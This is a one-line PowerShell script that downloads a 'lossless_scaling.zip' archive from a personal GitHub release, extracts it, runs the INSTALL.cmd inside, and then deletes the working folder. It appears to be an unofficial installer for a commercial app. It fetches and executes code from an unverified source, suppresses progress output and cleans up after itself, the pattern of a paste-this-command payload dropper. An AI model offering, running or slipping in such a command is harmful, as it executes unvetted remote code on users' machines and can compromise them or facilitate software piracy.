$p="C:\phwyverysad"; $z="$p\lossless_scaling.zip"; $u="https://github.com/phwyverysad/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/lossless_scaling.zip"; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $oldP=$ProgressPreference; $ProgressPreference='SilentlyContinue'; if(!(Test-Path $p)){New-Item -ItemType Directory -Path $p | Out-Null}; try{Write-Host "Downloading..."; (New-Object System.Net.WebClient).DownloadFile($u,$z); if(Test-Path $z){Write-Host "Extracting..."; $t="$p\temp"; Expand-Archive -Path $z -DestinationPath $t -Force; foreach($i in @("INSTALL.cmd","Shortcut","Setup")){$s=Join-Path $t $i; if(Test-Path $s){Move-Item $s $p -Force}}; Remove-Item $z,$t -Recurse -Force; $c="$p\INSTALL.cmd"; if(Test-Path $c){Write-Host "Running Install..."; Start-Process $c -WorkingDirectory $p -Wait}}}catch{Write-Host "Error: $_"}finally{Write-Host "Cleaning up..."; Start-Sleep -Seconds 2; if(Test-Path $p){Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; $ProgressPreference=$oldP; Write-Host "Done."}
